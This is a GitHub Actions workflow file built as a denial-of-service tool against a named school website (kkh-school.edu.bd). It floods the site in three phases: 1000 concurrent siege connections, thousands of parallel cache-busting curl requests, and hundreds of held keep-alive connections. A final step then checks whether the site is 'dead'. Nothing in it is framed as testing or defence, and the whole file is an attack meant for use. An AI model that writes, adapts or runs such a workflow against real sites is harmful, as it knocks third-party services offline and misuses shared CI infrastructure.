name: ACTUAL DESTRUCTION - NO BULLSHIT

on:
  workflow_dispatch:
    inputs:
      duration:
        description: 'Duration in seconds'
        default: '60'

jobs:
  kill-it:
    runs-on: ubuntu-latest
    
    steps:
      - name: Install siege
        run: sudo apt-get update && sudo apt-get install -y siege
      
      - name: PHASE 1 - Saturate connections
        run: |
          echo "Sending 1000 concurrent connections"
          siege -c 1000 -t ${{ github.event.inputs.duration }}s -b https://www.kkh-school.edu.bd/
      
      - name: PHASE 2 - Unique URL hammer (this actually works)
        run: |
          echo "Bypassing cache with unique URLs"
          seq 1 5000 | xargs -P 500 -I {} curl -s "https://www.kkh-school.edu.bd/?kill={}&rand=$RANDOM" -o /dev/null &
          sleep 10
      
      - name: PHASE 3 - Keep-alive hold
        run: |
          echo "Holding connections open"
          for i in {1..500}; do
            curl -s -H "Connection: keep-alive" "https://www.kkh-school.edu.bd/?hold=$i" &
          done
          sleep 30
      
      - name: Check corpse
        run: |
          curl --max-time 5 https://www.kkh-school.edu.bd/ || echo "SITE IS DEAD"
